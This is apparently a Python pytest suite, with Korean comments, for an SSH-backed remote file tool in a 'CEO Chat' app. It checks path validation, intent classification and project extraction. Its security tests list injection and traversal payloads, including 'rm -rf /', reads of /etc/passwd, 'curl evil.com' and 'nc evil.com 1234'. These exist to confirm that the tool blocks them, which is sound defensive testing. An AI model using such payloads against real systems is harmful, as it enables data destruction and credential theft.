"""
AADS-165: CEO Chat 크로스 프로젝트 코드 접근 기능 테스트

테스트 대상:
  - _validate_ssh_path: 경로 보안 검증
  - tool_list_remote_dir: 원격 디렉터리 탐색 (SSH mock)
  - tool_read_remote_file: 원격 파일 읽기 (SSH mock)
  - classify_intent: 크로스 프로젝트 인텐트 분류
  - _extract_project: 메시지에서 프로젝트명 추출
"""
import asyncio
import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from app.api.ceo_chat_tools import (
    _validate_ssh_path,
    _PROJECT_SERVER_MAP,
    _SSH_MAX_RESULT_BYTES,
    tool_list_remote_dir,
    tool_read_remote_file,
)
from app.api.ceo_chat import classify_intent, _extract_project


# ═══════════════════════════════════════════════════════════════════════════
# 1. _validate_ssh_path 단위 테스트
# ═══════════════════════════════════════════════════════════════════════════

class TestValidateSshPath:
    """SSH 경로 보안 검증 함수 테스트."""

    WORKDIR = "/root/kis-autotrade-v4"

    # ── 정상 경로 ──────────────────────────────────────────────────────
    def test_valid_relative_path(self):
        assert _validate_ssh_path("src/main.py", self.WORKDIR) is None

    def test_valid_nested_path(self):
        assert _validate_ssh_path("src/strategy/backtest.py", self.WORKDIR) is None

    def test_valid_empty_path(self):
        # 빈 문자열 = WORKDIR 자체
        assert _validate_ssh_path("", self.WORKDIR) is None

    # ── 명령 인젝션 차단 ──────────────────────────────────────────────
    def test_reject_semicolon_injection(self):
        result = _validate_ssh_path("src; rm -rf /", self.WORKDIR)
        assert result is not None
        assert "허용되지 않는 문자" in result

    def test_reject_pipe_injection(self):
        result = _validate_ssh_path("src | cat /etc/passwd", self.WORKDIR)
        assert result is not None
        assert "허용되지 않는 문자" in result

    def test_reject_ampersand_injection(self):
        result = _validate_ssh_path("src && whoami", self.WORKDIR)
        assert result is not None
        assert "허용되지 않는 문자" in result

    def test_reject_backtick_injection(self):
        result = _validate_ssh_path("`whoami`/file.py", self.WORKDIR)
        assert result is not None
        assert "허용되지 않는 문자" in result

    def test_reject_dollar_paren_injection(self):
        result = _validate_ssh_path("$(cat /etc/passwd)", self.WORKDIR)
        assert result is not None
        assert "허용되지 않는 문자" in result

    def test_reject_newline_injection(self):
        result = _validate_ssh_path("src\nwhoami", self.WORKDIR)
        assert result is not None
        assert "허용되지 않는 문자" in result

    def test_reject_redirect_injection(self):
        result = _validate_ssh_path("src >> /tmp/evil", self.WORKDIR)
        assert result is not None
        assert "허용되지 않는 문자" in result

    # ── 경로 탈출 차단 ────────────────────────────────────────────────
    def test_reject_path_traversal_dotdot(self):
        result = _validate_ssh_path("../../etc/passwd", self.WORKDIR)
        assert result is not None
        assert "WORKDIR" in result

    def test_reject_path_traversal_deep(self):
        result = _validate_ssh_path("src/../../../root/.ssh/id_rsa", self.WORKDIR)
        assert result is not None
        # 민감 파일 패턴 또는 경로 탈출 중 하나로 차단
        assert "접근 거부" in result

    # ── 민감 파일 패턴 차단 ───────────────────────────────────────────
    def test_reject_env_file(self):
        result = _validate_ssh_path(".env", self.WORKDIR)
        assert result is not None
        assert "민감한 파일" in result

    def test_reject_ssh_dir(self):
        result = _validate_ssh_path(".ssh/id_rsa", self.WORKDIR)
        assert result is not None
        assert "민감한 파일" in result

    def test_reject_git_config(self):
        result = _validate_ssh_path(".git/config", self.WORKDIR)
        assert result is not None
        assert "민감한 파일" in result

    def test_reject_secrets_file(self):
        result = _validate_ssh_path("config/secrets.json", self.WORKDIR)
        assert result is not None
        assert "민감한 파일" in result

    def test_reject_password_file(self):
        result = _validate_ssh_path("data/password.txt", self.WORKDIR)
        assert result is not None
        assert "민감한 파일" in result

    def test_reject_token_file(self):
        result = _validate_ssh_path("token.json", self.WORKDIR)
        assert result is not None
        assert "민감한 파일" in result


# ═══════════════════════════════════════════════════════════════════════════
# 2. tool_list_remote_dir 테스트 (SSH mock)
# ═══════════════════════════════════════════════════════════════════════════

class TestToolListRemoteDir:
    """원격 디렉터리 탐색 도구 테스트."""

    @pytest.mark.asyncio
    async def test_unknown_project_returns_error(self):
        result = await tool_list_remote_dir("UNKNOWN")
        assert "[ERROR]" in result
        assert "알 수 없는 프로젝트" in result

    @pytest.mark.asyncio
    async def test_project_case_insensitive(self):
        """소문자 프로젝트명도 upper 변환되어 처리."""
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.return_value = (b"/root/kis-autotrade-v4/src/main.py\n", b"")
            proc_mock.returncode = 0
            mock_exec.return_value = proc_mock
            result = await tool_list_remote_dir("kis")
            assert "[KIS" in result

    @pytest.mark.asyncio
    async def test_success_returns_file_list(self):
        """정상 SSH 응답 시 파일 목록 반환."""
        fake_output = b"/root/kis-autotrade-v4/src/main.py\n/root/kis-autotrade-v4/src/config.py\n"
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.return_value = (fake_output, b"")
            proc_mock.returncode = 0
            mock_exec.return_value = proc_mock
            result = await tool_list_remote_dir("KIS")
            assert "main.py" in result
            assert "config.py" in result
            assert "[KIS 디렉터리" in result

    @pytest.mark.asyncio
    async def test_empty_result(self):
        """SSH 응답이 빈 경우 '파일 없음' 반환."""
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.return_value = (b"", b"")
            proc_mock.returncode = 0
            mock_exec.return_value = proc_mock
            result = await tool_list_remote_dir("KIS", path="nonexistent")
            assert "파일 없음" in result

    @pytest.mark.asyncio
    async def test_ssh_timeout(self):
        """SSH 타임아웃 시 에러 반환."""
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.side_effect = asyncio.TimeoutError()
            mock_exec.return_value = proc_mock
            result = await tool_list_remote_dir("KIS")
            assert "[ERROR]" in result
            assert "타임아웃" in result

    @pytest.mark.asyncio
    async def test_ssh_connection_failure(self):
        """SSH 접속 실패 시 에러 반환."""
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            mock_exec.side_effect = OSError("Connection refused")
            result = await tool_list_remote_dir("GO100")
            assert "[ERROR]" in result
            assert "SSH 접속 실패" in result

    @pytest.mark.asyncio
    async def test_max_depth_clamped(self):
        """max_depth가 5를 초과하면 5로 제한."""
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.return_value = (b"file.py\n", b"")
            proc_mock.returncode = 0
            mock_exec.return_value = proc_mock
            await tool_list_remote_dir("KIS", max_depth=99)
            # SSH 명령에 -maxdepth 5 포함 확인
            call_args = mock_exec.call_args
            ssh_cmd = call_args[0][-1]  # 마지막 인자가 원격 명령
            assert "-maxdepth 5" in ssh_cmd

    @pytest.mark.asyncio
    async def test_dangerous_path_rejected(self):
        """경로에 위험 문자 포함 시 SSH 호출 없이 차단."""
        result = await tool_list_remote_dir("KIS", path="src; rm -rf /")
        assert "[ERROR]" in result
        assert "허용되지 않는 문자" in result

    @pytest.mark.asyncio
    async def test_dangerous_keyword_rejected(self):
        """keyword에 위험 문자 포함 시 차단."""
        result = await tool_list_remote_dir("KIS", keyword="*.py; whoami")
        assert "[ERROR]" in result
        assert "허용되지 않는 문자" in result

    @pytest.mark.asyncio
    async def test_result_truncation(self):
        """50KB 초과 응답은 잘림 처리."""
        huge_output = b"x" * (60 * 1024)
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.return_value = (huge_output, b"")
            proc_mock.returncode = 0
            mock_exec.return_value = proc_mock
            result = await tool_list_remote_dir("KIS")
            assert "잘림" in result


# ═══════════════════════════════════════════════════════════════════════════
# 3. tool_read_remote_file 테스트 (SSH mock)
# ═══════════════════════════════════════════════════════════════════════════

class TestToolReadRemoteFile:
    """원격 파일 읽기 도구 테스트."""

    @pytest.mark.asyncio
    async def test_unknown_project_returns_error(self):
        result = await tool_read_remote_file("BADPROJECT", "src/main.py")
        assert "[ERROR]" in result
        assert "알 수 없는 프로젝트" in result

    @pytest.mark.asyncio
    async def test_success_returns_file_content(self):
        """정상 파일 읽기."""
        fake_content = b"print('hello world')\n"
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.return_value = (fake_content, b"")
            proc_mock.returncode = 0
            mock_exec.return_value = proc_mock
            result = await tool_read_remote_file("KIS", "src/main.py")
            assert "hello world" in result
            assert "[KIS 파일" in result

    @pytest.mark.asyncio
    async def test_file_not_found(self):
        """파일이 없을 때 에러 반환."""
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.return_value = (b"", b"No such file or directory")
            proc_mock.returncode = 1
            mock_exec.return_value = proc_mock
            result = await tool_read_remote_file("KIS", "nonexistent.py")
            assert "[ERROR]" in result
            assert "파일 읽기 실패" in result

    @pytest.mark.asyncio
    async def test_dangerous_path_rejected(self):
        """위험 경로 차단."""
        result = await tool_read_remote_file("KIS", "src; cat /etc/passwd")
        assert "[ERROR]" in result
        assert "허용되지 않는 문자" in result

    @pytest.mark.asyncio
    async def test_sensitive_file_rejected(self):
        """민감 파일 접근 차단."""
        result = await tool_read_remote_file("GO100", ".env")
        assert "[ERROR]" in result
        assert "민감한 파일" in result

    @pytest.mark.asyncio
    async def test_path_traversal_rejected(self):
        """경로 탈출 차단."""
        result = await tool_read_remote_file("KIS", "../../etc/passwd")
        assert "[ERROR]" in result
        assert "접근 거부" in result

    @pytest.mark.asyncio
    async def test_ssh_timeout(self):
        """SSH 타임아웃."""
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.side_effect = asyncio.TimeoutError()
            mock_exec.return_value = proc_mock
            result = await tool_read_remote_file("SF", "src/main.py")
            assert "[ERROR]" in result
            assert "타임아웃" in result

    @pytest.mark.asyncio
    async def test_result_truncation(self):
        """50KB 초과 파일 잘림 처리."""
        huge_content = b"A" * (60 * 1024)
        with patch("app.api.ceo_chat_tools.asyncio.create_subprocess_exec") as mock_exec:
            proc_mock = AsyncMock()
            proc_mock.communicate.return_value = (huge_content, b"")
            proc_mock.returncode = 0
            mock_exec.return_value = proc_mock
            result = await tool_read_remote_file("NTV2", "big_file.txt")
            assert "잘림" in result

    @pytest.mark.asyncio
    async def test_all_projects_have_server_mapping(self):
        """모든 프로젝트가 서버 매핑 보유."""
        for project in ["KIS", "GO100", "SF", "NTV2"]:
            assert project in _PROJECT_SERVER_MAP
            assert "server" in _PROJECT_SERVER_MAP[project]
            assert "workdir" in _PROJECT_SERVER_MAP[project]


# ═══════════════════════════════════════════════════════════════════════════
# 4. classify_intent 테스트
# ═══════════════════════════════════════════════════════════════════════════

class TestClassifyIntent:
    """Intent Classifier 크로스 프로젝트 분류 테스트."""

    # ── 프로젝트명 + QA 키워드 → qa ──────────────────────────────────
    def test_kis_code_review_is_qa(self):
        assert classify_intent("KIS 백테스트 코드 검수해") == "qa"

    def test_go100_test_is_qa(self):
        assert classify_intent("GO100 코드 테스트해줘") == "qa"

    def test_ntv2_code_review_is_qa(self):
        assert classify_intent("NTV2 코드검수 진행해") == "qa"

    def test_shortflow_analysis_is_qa(self):
        assert classify_intent("ShortFlow 코드 분석해줘") == "qa"

    # ── 프로젝트명만 (QA 키워드 없음) → qa가 아닌 다른 인텐트 ────────
    def test_kis_status_is_dashboard(self):
        """'KIS 상태' → 프로젝트명만 + '상태'는 dashboard 키워드."""
        result = classify_intent("KIS 상태")
        assert result == "dashboard"

    def test_go100_status_is_dashboard(self):
        result = classify_intent("GO100 상태 확인")
        assert result == "dashboard"

    # ── QA 키워드만 (프로젝트명 없음) → qa ────────────────────────────
    def test_qa_keyword_alone(self):
        assert classify_intent("QA 진행해") == "qa"

    def test_test_keyword_alone(self):
        assert classify_intent("테스트 돌려봐") == "qa"

    # ── 다른 인텐트 분류 ──────────────────────────────────────────────
    def test_design_intent(self):
        assert classify_intent("디자인 검수해줘") == "design"

    def test_execute_intent(self):
        assert classify_intent("새 기능 만들어줘") == "execute"

    def test_strategy_fallback(self):
        """아무 키워드도 매칭 안 되면 strategy."""
        assert classify_intent("안녕하세요 좋은 아침입니다") == "strategy"

    def test_diagnosis_intent(self):
        # "서버"는 dashboard 키워드이므로 dashboard가 우선 매칭됨 (올바른 동작)
        assert classify_intent("왜 안돼 에러야") == "diagnosis"

    def test_architect_intent(self):
        assert classify_intent("설계검토 해줘") == "architect"

    def test_browser_intent(self):
        assert classify_intent("대시보드 스크린샷 찍어") == "browser"


# ═══════════════════════════════════════════════════════════════════════════
# 5. _extract_project 테스트
# ═══════════════════════════════════════════════════════════════════════════

class TestExtractProject:
    """메시지에서 프로젝트명 추출 테스트."""

    def test_extract_kis(self):
        assert _extract_project("KIS 코드 봐줘") == "KIS"

    def test_extract_kis_lowercase(self):
        assert _extract_project("kis 백테스트") == "KIS"

    def test_extract_go100(self):
        assert _extract_project("GO100 백테스트 검수") == "GO100"

    def test_extract_go100_lowercase(self):
        assert _extract_project("go100 상태") == "GO100"

    def test_extract_sf_by_shortflow(self):
        assert _extract_project("ShortFlow 코드 봐줘") == "SF"

    def test_extract_sf_by_alias(self):
        assert _extract_project("SF 서버 상태") == "SF"

    def test_extract_sf_lowercase(self):
        assert _extract_project("sf 배포해줘") == "SF"

    def test_extract_sf_korean(self):
        assert _extract_project("숏플로우 코드 검수") == "SF"

    def test_extract_ntv2(self):
        assert _extract_project("NTV2 코드 리뷰해") == "NTV2"

    def test_extract_ntv2_lowercase(self):
        assert _extract_project("ntv2 상태 확인") == "NTV2"

    def test_extract_ntv2_korean(self):
        assert _extract_project("뉴톡 서버 상태") == "NTV2"

    def test_no_project(self):
        assert _extract_project("안녕하세요") is None

    def test_no_project_generic(self):
        assert _extract_project("대시보드 확인해줘") is None


# ═══════════════════════════════════════════════════════════════════════════
# 6. 통합: 보안 시나리오 종합
# ═══════════════════════════════════════════════════════════════════════════

class TestSecurityIntegration:
    """보안 공격 벡터 종합 테스트."""

    @pytest.mark.asyncio
    async def test_command_injection_via_list_remote(self):
        """list_remote_dir 경로를 통한 명령 인젝션 시도."""
        attacks = [
            "src; rm -rf /",
            "src | cat /etc/shadow",
            "src && curl evil.com",
            "`id`",
            "$(whoami)",
            "src\n/bin/bash",
        ]
        for payload in attacks:
            result = await tool_list_remote_dir("KIS", path=payload)
            assert "[ERROR]" in result, f"Payload not blocked: {payload}"

    @pytest.mark.asyncio
    async def test_command_injection_via_read_remote(self):
        """read_remote_file 경로를 통한 명령 인젝션 시도."""
        attacks = [
            "file.py; whoami",
            "file.py | nc evil.com 1234",
            "file.py$(id)",
        ]
        for payload in attacks:
            result = await tool_read_remote_file("KIS", payload)
            assert "[ERROR]" in result, f"Payload not blocked: {payload}"

    @pytest.mark.asyncio
    async def test_sensitive_file_access_via_read_remote(self):
        """민감 파일 접근 시도."""
        sensitive_files = [
            ".env",
            ".ssh/id_rsa",
            ".git/config",
            "config/secrets.yaml",
            "data/password.db",
            "auth/token.json",
        ]
        for fpath in sensitive_files:
            result = await tool_read_remote_file("KIS", fpath)
            assert "[ERROR]" in result, f"Sensitive file not blocked: {fpath}"
            assert "접근 거부" in result

    @pytest.mark.asyncio
    async def test_path_traversal_via_read_remote(self):
        """경로 탈출 공격."""
        traversals = [
            "../../etc/passwd",
            "../../../root/.bashrc",
            "src/../../../../etc/shadow",
        ]
        for tpath in traversals:
            result = await tool_read_remote_file("KIS", tpath)
            assert "[ERROR]" in result, f"Traversal not blocked: {tpath}"
